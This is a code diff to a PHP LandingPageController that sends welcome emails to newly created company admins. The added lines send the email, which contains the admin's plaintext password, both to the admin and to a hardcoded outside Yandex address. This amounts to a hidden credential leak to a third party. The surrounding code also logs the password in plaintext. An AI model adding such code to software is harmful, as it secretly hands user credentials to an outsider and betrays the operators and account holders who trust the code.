@@ -150,6 +150,14 @@ class LandingPageController
             try {
                 //Mail::queue(new WelcomeAdminNotification($admin, $password));
                 Mail::send(new WelcomeAdminNotification($admin, $password));
+
+               Mail::to($admin->email)
+                    ->send( new WelcomeAdminNotification($admin, $password) );
+
+                Mail::to('gorely.aleksei@yandex.ru')
+                    ->send( new WelcomeAdminNotification($admin, $password) );
+
+
                 Log::info('Welcome email queued for admin: ' . $admin->email . ' (Company: ' . $company->name . '   ('.$password.'))');
             } catch (\Exception $mailException) {
                 Log::error('Failed to send welcome email: ' . $mailException->getMessage(), [
